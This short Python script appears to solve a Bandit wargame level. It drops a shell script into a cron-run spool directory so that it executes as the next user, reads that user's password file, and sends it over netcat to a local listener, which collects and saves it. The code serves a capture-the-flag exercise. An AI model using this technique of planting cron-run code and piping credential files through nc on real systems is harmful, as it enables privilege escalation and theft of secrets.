from util import *

port = get_port()

# a script we put in /var/spool/bandit24 will be run as bandit24
script = f"""#!/bin/bash
(echo hello; cat /etc/bandit_pass/bandit24) | nc -vv -q1 localhost {port}
"""

shell = open_ssh()

filename = f"/var/spool/bandit24/{randoms(10)}.sh"
shell.upload_data(script, filename)
shell.system(f"chmod +x {filename}")

log.warn("Starting listener, kill the process if this hangs for more than 1 minute")
conn = shell.listen(port)

conn.wait_for_connection()
conn.recvuntil("hello")
pwd = conn.recvall().strip()

write(password(), pwd)
